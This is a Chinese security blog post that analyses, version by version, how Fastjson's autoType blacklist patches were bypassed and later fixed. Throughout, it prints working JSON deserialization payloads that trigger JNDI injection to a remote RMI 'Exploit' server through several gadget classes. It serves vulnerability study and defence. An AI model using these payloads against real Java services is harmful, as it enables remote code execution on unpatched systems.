---
title: Fastjson历史补丁Bypass分析
categories:
  - Web安全
tags:
  - Fastjson反序列化
  - 漏洞分析
  - JavaSec
toc: true 文章目录
author: BlBana
date: 2020-04-16 21:54:40
description:
comments:
original:
permalink:
---

> 本篇是开坑系列第五篇，在Fastjson 1.2.24版本之后，加入了checkAutoType()函数的校验，主要利用黑白名单对要反序列化的类进行校验，以下的Bypass都是基于黑名单的绕过情况（autoTypeSupport=true）。从已有的分析资料来看，主要几个绕过的点分别在1.2.41，1.2.42，1.2.43，1.2.45，1.2.47，1.2.62，1.2.66，1.2.68这几个版本

<!-- more -->

---

# Fastjson历史补丁Bypass分析

# 漏洞限制

> JDK版本对于JDNI注入的限制，基于RMI利用的JDK版本<=6u141、7u131、8u121，基于LDAP利用的JDK版本<=6u211、7u201、8u191

本文测试全部使用的是：`1.6.0_65`部分payload测试使用`1.8.0_161`

# 补丁Bypass

Fastjson补丁Bypass的情况主要分为以下两种情况:

- 黑名单检测机制被绕过，导致同一条利用链重复利用；
- 黑名单被绕过，发现新的Gadget链；

# 版本1.2.25

Fastjson从此版本开始引入了checkAutoType()函数，利用黑白名单对要反序列化的类进行校验，下面是具体的补丁信息。

## 补丁

- [补丁commit](https://github.com/alibaba/fastjson/commit/90af6aadfa9be7592fdc8e174458ddaebb2b19c4)
- [1.2.25](https://github.com/alibaba/fastjson/tree/1.2.25)

---



# 版本1.2.41

## 绕过原因

这里使用的还是`com.sun.rowset.JdbcRowSetImpl` 的利用链，先尝试运行之前的PoC

```java
"{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":false}"

```

```java
// 命中黑名单
Exception in thread "main" com.alibaba.fastjson.JSONException: autoType is not support. com.sun.rowset.JdbcRowSetImpl
	at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:907)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:308)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1335)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1301)
	at com.alibaba.fastjson.JSON.parse(JSON.java:152)
	at com.alibaba.fastjson.JSON.parse(JSON.java:162)
	at com.alibaba.fastjson.JSON.parse(JSON.java:131)
	at cc.blbana.vul.fastjson.FJPoC.main(FJPoC.java from InputFileObject:12)
```

修改PoC内容，成功触发，执行命令，关键部分为：**Lcom.sun.rowset.JdbcRowSetImpl;**

```java
"{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\", \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":false}"
```

![Fastjson%20Bypass/Untitled.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/0.png)

## 详情分析

直接跟进到checkAutoType()方法中，黑名单中使用`classname.startsWith(deny)`判断是否为恶意类，可以看到加了`L`后绕过了检测。

问题来了：加了 **L和; **的类是否能成功获取到Class对象，继续跟进一下

![Fastjson%20Bypass/Untitled%201.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/1.png)

在黑白名单都未找到对应Class对象时，会进入到`TypeUtils.loadClass` 方法中，自动去掉前后两个符号并返回去Class对象

![Fastjson%20Bypass/Untitled%202.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/2.png)

## 补丁

到了1.2.42，对以上这种绕过方式进行了修复，具体commit如下：

- [补丁commit](https://github.com/alibaba/fastjson/commit/e701faa2da7cff6d94394061bbff06a166c2aaaf)
- [1.2.42](https://github.com/alibaba/fastjson/tree/1.2.42)

## 修复思路

- 修改之前明文方式的`denyList`为`denyHashCodes`，防止研究人员根据包名找到新的利用链；
- 将`Lcom.sun.rowset.JdbcRowSetImpl;` 前后符号去掉并处理为`hashCode`加入黑名单

---

# 版本1.2.42

## 绕过原因

> 从1.2.42开始使用denyHashCodes的方式进行黑白名单检测

先给出PoC，关键部分为：**LLcom.sun.rowset.JdbcRowSetImpl;;**

```java
"{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\", \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":false}"
```

## 详情分析

刚刚提到了为了提高攻击门槛，Fastjson将黑名单转成了哈希的形式，避免被直接利用。

但是由于修复过程中只考虑到了`Lcom.sun.rowset.JdbcRowSetImpl;`情况，并对其中的类名进行了一次提取，并将提取后的结果取`hashCode`进行判断，导致`LLcom.sun.rowset.JdbcRowSetImpl;;`或者前后加更多的`L和;`也能进行绕过，具体原因下面分析：

![Fastjson%20Bypass/Untitled%203.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/3.png)

> 可以看到上图是1.2.42中的两次不同判断方式，可能再第一次直接使用明文后，考虑到会被直接想到使用加符号的形式绕过低版本，也同样改成了使用hashCode的形式进行判断。

利用`Lcom.sun.rowset.JdbcRowSetImpl;`的hashCode绕过了黑名单，接下来利用`typeName`获取Class对象，可以看到`typeName`为`LLcom.sun.rowset.JdbcRowSetImpl;;`，为什么还是能执行 ？

![Fastjson%20Bypass/Untitled%204.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/4.png)

由于Fastjson在提取类名上的一些特性，当检测到开头为`L`结尾为`;`时，就会一直循环提取`L和;`之间的内容，直到提取到真正的类名。

![Fastjson%20Bypass/Untitled%205.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/5.png)

## 补丁

- [补丁commit](https://github.com/alibaba/fastjson/commit/f92e43095031935a2f8086f2de8831f45c3a34e5)
- [1.2.43](https://github.com/alibaba/fastjson/tree/1.2.43)

## 修复思路

由于使用上面的方式绕过，类名前面会出现至少两个`L`，因此在判断了开头为`L`，结尾为`;`时，会再判断第二个字符是否为`L`

```java
if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
    if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) {
        throw new JSONException("autoType is not support. " + typeName);
    }

    className = className.substring(1, className.length() - 1);
}
```

> 在比较hashCode的时候看到了一些小细节，本来只需要对每个类名计算一次hash并进行黑白名单对比即可，但在下面代码可以看到，会从第4个字符开始分别与hash值做异或，再进行判断，也是为了提高一些攻击门槛把，但最后还是被对比了出来，真的是世上本没有漏洞，自从有了安全研究后，漏洞就层出不穷，哈哈 ...

```java
for(i = 3; i < className.length(); ++i) {
    hash ^= (long)className.charAt(i);
    hash *= 1099511628211L;
    if (Arrays.binarySearch(this.acceptHashCodes, hash) >= 0) {
        clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
        if (clazz != null) {
            return clazz;
        }
    }

    if (Arrays.binarySearch(this.denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null) {
        throw new JSONException("autoType is not support. " + typeName);
    }
}
```

---

# 版本1.2.43

## 绕过原因

直接放出payload，运行即可绕过黑名单执行命令，关键部分为：**[com.sun.rowset.JdbcRowSetImpl**

```java
"{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[,{ \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":false}"
```

可以看到在核心部分后还有`[{` 两个字符，尝试先传入没有这两个字符的`payload`，出现错误

```java
"{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":false}"

// 异常显示在第42个字符位置，期望传入的是一个"["，但是现在是一个逗号","
Exception in thread "main" com.alibaba.fastjson.JSONException: exepct '[', but ,, pos 42, json : {"@type":"[com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"rmi://localhost:1099/Exploit", "autoCommit":false}
```

根据上述报错信息调整payload，再次发送，依然报错

```java
"{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":false}"

// 异常显示在第44个字符位置，期望传入的是一个"{"
Exception in thread "main" com.alibaba.fastjson.JSONException: syntax error, expect {, actual string, pos 44, fastjson-version 1.2.43
```

再次调整payload，在逗号后面加入字符`"{"`，成功触发

> 这里发现和"{"写在逗号前后都可以触发payload，下面会仔细跟进一下这块是什么情况

## 详情分析

由于开头使用了`"["`字符，这个版本的修改也只是判断了下开头是否为`LL` ，这中写法由于黑名单中没有，自然绕过了hashCode的检测，当开头为`"["`，会提取类名，并将获取到的Class对象放入到数组中，在这里是没有出现异常的并且Class已经正常获取到，可以继续向下跟进

```java
// TypeUtils.loadClass方法中
else if (className.charAt(0) == '[') {
    Class<?> componentType = loadClass(className.substring(1), classLoader);
    return Array.newInstance(componentType, 0).getClass();
}
```

`thisObj = deserializer.deserialze(this, clazz, fieldName);` 紧接着进入正常的反序列化流程，使用`ObjectArrayCodec`类型的反序列化器进行反序列化，其中会提取数组中的成员类型并使用`parser.parseArray` 进行解析

![Fastjson%20Bypass/Untitled%206.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/6.png)

当前token不为14时，即会判断是否为`"["` ，如果不是会抛出异常；

```java
if (token != 14) {
    throw new JSONException("exepct '[', but " + JSONToken.name(token) + ", " + this.lexer.info());
} else {
```

当前token不为12 或者 16时，即会判断是否为`"{"` 或者 `","`，会在进入if流程后抛出异常，下面有一个char和token的对照关系；

```java
if (token != 12 && token != 16) {
...
if (token == 14 && lexer.getCurrent() == ']') {
    lexer.next();
    lexer.nextToken();
    typeKey = null;
    return typeKey;
} else {
    StringBuffer buf = (new StringBuffer()).append("syntax error, expect {, actual ").append(lexer.tokenName()).append(", pos ").append(lexer.pos());
    if (fieldName instanceof String) {
        buf.append(", fieldName ").append(fieldName);
    }

    buf.append(", fastjson-version ").append("1.2.43");
    throw new JSONException(buf.toString());
}

// fastjson-1.2.43.jar!/com/alibaba/fastjson/parser/JSONLexerBase.class
this.ch == ',' this.token = 16
this.ch == '[' this.token = 14
this.ch == '{' this.token = 12
this.ch == '\'' this.token = 4
```

因此依次满足上面的条件即可触发payload，有个问题是为什么`"{"`在逗号前后都能触发，解析过程中判断到当前字符为16，也就是逗号时，会直接跳过该字符，进入下一个字符的处理，因此在`"["`后无论是先写逗号还是`"{"`，最终都是解析`"{"`字符

```java
if (this.lexer.isEnabled(Feature.AllowArbitraryCommas)) {
    while(this.lexer.token() == 16) {
        this.lexer.nextToken();
    }
}
```

## 补丁

- [补丁commit](https://github.com/alibaba/fastjson/commit/496418f626bda1e8cc285c5b49cbd2e55e82a5eb)
- [1.2.44](https://github.com/alibaba/fastjson/tree/1.2.44)

## 修复思路

修复方式也很直接，就是截取第一个字符根据hashCode判断是否为`"["`，就很暴力 ~ 

```java
long h1 = (-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L;
if (h1 == -5808493101479473382L) {
    throw new JSONException("autoType is not support. " + typeName);
}
```

commit中还对之前`Lxxx;`类型payload的检测代码进行了合并，先检测第一个字符hashCode h1，为`[`抛出异常；再将其跟`;`做hashCode判断是否为之前的绕过。

---

# 版本1.2.45

## 绕过原理

- 原理：使用新的Gadget绕过黑名单
- 利用条件：需要目标服务器存在mybatis的jar包，`3.0.1 ≤ 版本 ≤ 3.4.6，`[下载地址](https://mvnrepository.com/artifact/org.mybatis/mybatis)

以下为PoC，主要利用了JNDI注入，访问恶意的远程注册中心，`data_source`可以连LDAP和RMI

主要PoC：`org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`，直接运行即可触发

```java
"{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://localhost:1099/Exploit\"}}";
```

## 详情分析

之前的补丁对类名的第一个字符进行检测，出现`"["`则抛出异常，但是这个类不会触发前面的检测机制，并且黑名单中不存在这个类的hashCode，成功绕过`checkAutoType`的检测

运行跟进调试`org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`利用链，因为`setProperties` 方法[符合之前说的筛选要求](https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/#Note%EF%BC%9A%E5%85%B3%E4%BA%8EJavaBeanInfo%E7%9A%84build%E6%96%B9%E6%B3%95)，因此在反序列化的过程中会被自动调用`setProperties`方法，由于`properties`中属性`data_source`可控，并且进入到`lookup`方法，从而造成JNDI注入引起命令执行

```java
public void setProperties(Properties properties) {
        try {
            InitialContext initCtx = null;
            Properties env = getEnvProperties(properties);
            if (env == null) {
                initCtx = new InitialContext();
            } else {
                initCtx = new InitialContext(env);
            }

            if (properties.containsKey("initial_context") && properties.containsKey("data_source")) {
                Context ctx = (Context)initCtx.lookup(properties.getProperty("initial_context"));
                this.dataSource = (DataSource)ctx.lookup(properties.getProperty("data_source"));
            } else if (properties.containsKey("data_source")) {
                this.dataSource = (DataSource)initCtx.lookup(properties.getProperty("data_source"));
            }

        } catch (NamingException var5) {
            throw new DataSourceException("There was an error configuring JndiDataSourceTransactionPool. Cause: " + var5, var5);
        }
    }
```

## 补丁

- [补丁commit](https://github.com/alibaba/fastjson/commit/f51faee23fb9ca81cc802eaf890302e49124e1b3)
- [1](https://github.com/alibaba/fastjson/tree/1.2.44)[.2.46](https://github.com/alibaba/fastjson/tree/1.2.46)

## 修复思路

从commit记录中可以看到denyHashCodes中又增加了很多类的hashCode，其中根据github blacklist对比发现`-8083514888460375884L`为`org.apache.ibatis.datasource`，完成黑名单添加，并且在1.2.46中官方扩充了不少黑名单，具体可以根据hashCode对比blacklist查看是哪个类

---

# 版本1.2.47

## 绕过原因

> setAutoTypeSupport为True 或者 False 都可以触发

- 原理：使用新的Gadget绕过黑名单
- 利用条件
  - **需要 1.2.33 ≤ Fastjson版本 ≤ 1.2.47，是否开启`setAutoTypeSupport`都能成功**
  - **需要 1.2.25 ≤ Fastjson版本 ≤ 1.2.32，关闭`setAutoTypeSupport`能成功**

直接放出payload，运行即可绕过黑名单执行命令

```java
"{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}}}";
```

## 详情分析

先贴出这个payload的调用栈，跟着分析一下具体流程

![Fastjson%20Bypass/Untitled%207.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/7.png)

### 1.2.47，开启`**setAutoTypeSupport**`分析

由于PoC开头不为@type等预置类型，因此按照Map类型进行解析，具体Map类型解析可以看我的 [Fastjson反序列化基础](https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/)，跟进parseObject分析其中关键步骤

![Fastjson%20Bypass/Untitled%208.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/8.png)

因为typeName为`java.lang.Class`不在黑名单，成功绕过检测，在`this.deserializers.findClass`中找到其Class类并返回

![Fastjson%20Bypass/Untitled%209.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/9.png)

紧接着进入到`MiscCodec`的`deserialze`方法中，在parser.parse后获取到value值`com.sun.rowset.JdbcRowSetImpl`，并在判断好clazz类型后，开始加载`strVal`的Class对象

![Fastjson%20Bypass/Untitled%2010.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/10.png)

![Fastjson%20Bypass/Untitled%2011.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/11.png)

在TypeUtils.loadClass中，成功加载目标类Class并放入缓存数组`mappings`中 ，完成第一组键值对的反序列化

![Fastjson%20Bypass/Untitled%2012.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/12.png)

紧接着进入第二组，键值对的反序列化，也是触发漏洞的关键步骤，可以看到在`autoTypeSupport`为true时，在黑名单检测过程中需要同时满足两个条件，由于`TypeUtils.getClassFromMapping(typeName)`从mapping中获取到了`com.sun.rowset.JdbcRowSetImpl`类的Class，导致条件不成立，绕过黑名单抛出异常的代码

![Fastjson%20Bypass/Untitled%2013.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/13.png)

之后进入正常的反序列化流程，详情见 Fastjson JdbcRowSetImpl利用链分析

### 1.2.47，关闭`**setAutoTypeSupport**`分析

关闭后就更直接了，直接因为`autoTypeSupport`为false不会进入到上面的黑名单检测过程，直接从mapping缓存中获取到目标类Class，进入之后的反序列化流程

![Fastjson%20Bypass/Untitled%2014.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/14.png)

### 1.2.32，开启`**setAutoTypeSupport**`分析

在此版本，开启`autoTypeSupport`的情况下，直接运行PoC会抛出`is not support`的异常，分析发现在第一部分解析过程中，与之前没有太大区别，`java.lang.Class`绕过黑名单被解析为Class类型，并将目标类Class放入到mapping中，但由于没有了之前要同时满足两个条件的限制，导致被黑名单检测，抛出异常

![Fastjson%20Bypass/Untitled%2015.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/15.png)

### 1.2.32，关闭`**setAutoTypeSupport**`分析

在此版本，关闭`autoTypeSupport`的情况下，由于没有直接进入黑名单检测，在之后白名单检测之前，进入到`TypeUtils.getClassFromMapping`成功获取到目标类并返回，之后正常反序列化导致命令执行

![Fastjson%20Bypass/Untitled%2016.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/16.png)

## 补丁

- [补丁commit](https://github.com/alibaba/fastjson/commit/11b92d9f33119ca2af1a3fe6f474de5c1810e686)
- [1.2.48](https://github.com/alibaba/fastjson/tree/1.2.48)

这个绕过不像之前一样只是单纯的对黑名单的绕过，更多的是结合了Fastjson特性机制，利用其缓存的特点，绕过了黑白名单的检测。对于这种类型的漏洞挖掘，更多的是需要对挖掘目标的了解，在充分了解其特性后，再去构造Payload。

## 修复思路

- 跟上一个绕过修复思路一样，还是在denyHashCodes中增加了本次绕过类`java.lang.Class` 的hashCode
- 把默认的**缓存true改为false**

---

# 版本1.2.62

## 绕过原理

- 原理：使用新的Gadget绕过黑名单
- 利用条件
  - **需要 Fastjson版本 ≤ 1.2.62，并且需要开启`setAutoTypeSupport`**

### org.apache.ibatis.ibatis-sqlmap-2.3.4.726.jar

关键PoC：**com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig**

```java
"{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"rmi://localhost:1099/Exploit\"}}";
```

## 详情分析

- `utxName`可控，造成JNDI注入

![Fastjson%20Bypass/Untitled%2017.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/17.png)

## 修复思路

增加黑名单

---

# 版本1.2.66

## 绕过原理

- 原理：使用新的Gadget绕过黑名单
- 利用条件
  - **需要 Fastjson版本 ≤ 1.2.66，并且需要开启`setAutoTypeSupport`**

在1.2.66及其之前又出现了一些JNDI注入的利用链，下面列出PoC，并简单的分析一些

### org.apache.shiro-core-1.5.1.jar

关键PoC：**org.apache.shiro.jndi.JndiObjectFactory**

```java
"{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"rmi://localhost:1099/Exploit\"}"
```

### br.com.anteros.Anteros-DBCP-1.0.1.jar

关键PoC：**br.com.anteros.dbcp.AnterosDBCPConfig**

```java
"{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"rmi://localhost:1099/Exploit\"}"
```

### org.apache.ignite.ignite-jta.1.1.0-incubating.jar

关键PoC：**org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup**

```java
"{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"rmi://localhost:1099/Exploit\"}"
```

## 详情分析

### org.apache.shiro-core-1.5.1.jar

- 这条链需要注意的是，在反序列化时需要使用parseObject进行

![Fastjson%20Bypass/Untitled%2018.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/18.png)

- 由于parseObject需要返回JSONObject类型对象，继承了Map，在使用toJSON进行转换的时候会遍历其字段，并调用字段getter获取value放到Map中，在调用getInstance()方法时触发JNDI注入

![Fastjson%20Bypass/Untitled%2019.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/19.png)

### br.com.anteros.Anteros-DBCP-1.0.1.jar

- 绕过黑名单，获取到目标类Class

![Fastjson%20Bypass/Untitled%2020.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/20.png)

- 调用目标Class的`setMetricRegistry`方法，进入`lookup`完成JNDI注入

![Fastjson%20Bypass/Untitled%2021.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/21.png)

![Fastjson%20Bypass/Untitled%2022.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/22.png)

### org.apache.ignite.ignite-jta.1.1.0-incubating.jar

- 这条链需要注意的是，在反序列化时需要使用parseObject进行
- 在反序列化过程中，调用setJndiNames方法给Object setValue

![Fastjson%20Bypass/Untitled%2023.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/23.png)

- 由于parseObject需要返回JSONObject类型对象，继承了Map，在使用toJSON进行转换的时候会遍历其字段，并调用字段getter获取value放到Map中，在调用getTm()方法时触发JNDI注入

![Fastjson%20Bypass/Untitled%2024.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/24.png)

![Fastjson%20Bypass/Untitled%2025.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/25.png)

## 补丁

分别在下列两个版本增加了黑名单

- [1.2.67](https://github.com/alibaba/fastjson/tree/1.2.67)
- [1.2.68](https://github.com/alibaba/fastjson/tree/1.2.68)

## 修复思路

增加黑名单

---

# 版本1.2.68

1.2.68版本增加了新的安全参数Safe_mode：[https://github.com/alibaba/fastjson/wiki/fastjson_safemode](https://github.com/alibaba/fastjson/wiki/fastjson_safemode)

## 机制分析

从1.2.68开始新增了一个Safe_mode，打开以后直接禁用autoType功能，调试了下代码发现很直接就是在进入autoType逻辑之前给你整彻底了 。。。设置为true的时候啥也过不去，只要设置@type类型，想反序列化指定类对象的时候，就会抛异常，真可太真实了，我疯起来连我自己都 X

![Fastjson%20Bypass/Untitled%2026.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/26.png)

![Fastjson%20Bypass/Untitled%2027.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/27.png)

# 哈希黑名单

从1.2.42版本开始为了防止安全研究人员分析黑名单中的利用链，把黑名单从原本明文的形式改为了哈希过的黑名单，目的还是为了提高利用门槛，不过在Github上已经有人跑出了大部分包名

- [https://github.com/LeadroyaL/fastjson-blacklist](https://github.com/LeadroyaL/fastjson-blacklist)

# 总结

之后Fastjson主要修复方式也是对黑名单的补充，还是具有很大的隐患，一旦出现新的攻击链，很容易会绕过。

虽然有了safe_mode，但是相当于废掉了这个功能，感觉不会有太多人开启这个参数。

还是尽量使用白名单，减少一些攻击面。主要绕过点有以下几个：

1. JDK中存在新的利用链（包括反序列化命令执行，反序列化引起XXE等各种类型问题）；
2. 引入三方依赖中可以利用；
3. 黑名单的检测机制被绕过；
4. 应用本身存在安全隐患。

分析了这么多Fastjson补丁后发现，真的是与人斗，其乐无穷，我挖一个点，你修一个点，也充分体现出了攻防的过程，但防御总是感觉被动一些。不过开发的过程中还是要做到安全编码，具备一些安全意识，即便无法完全防御，也要提高攻击门槛，毕竟攻防之间也是成本的博弈，说要做的绝对的安全也是不可能的，安全性、可用性、稳定性之间总是要有所割舍。

# 参考链接

- [https://www.mi1k7ea.com/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)

  

- [https://p0sec.net/index.php/archives/123/](https://p0sec.net/index.php/archives/123/)

  

- [http://www.lmxspace.com/2019/06/29/FastJson-反序列化学习/#几种bypass方法](http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/#%E5%87%A0%E7%A7%8Dbypass%E6%96%B9%E6%B3%95)



- [https://www.kingkk.com/2019/07/Fastjson反序列化漏洞-1-2-24-1-2-48/](https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/)



- [https://p0sec.net/index.php/archives/123/](https://p0sec.net/index.php/archives/123/)



- [https://hu3sky.github.io/2019/10/05/Thinkphp多个版本注入分析/](https://hu3sky.github.io/2019/10/05/Thinkphp%E5%A4%9A%E4%B8%AA%E7%89%88%E6%9C%AC%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/)



- https://mp.weixin.qq.com/s/0a5krhX-V_yCkz-zDN5kGg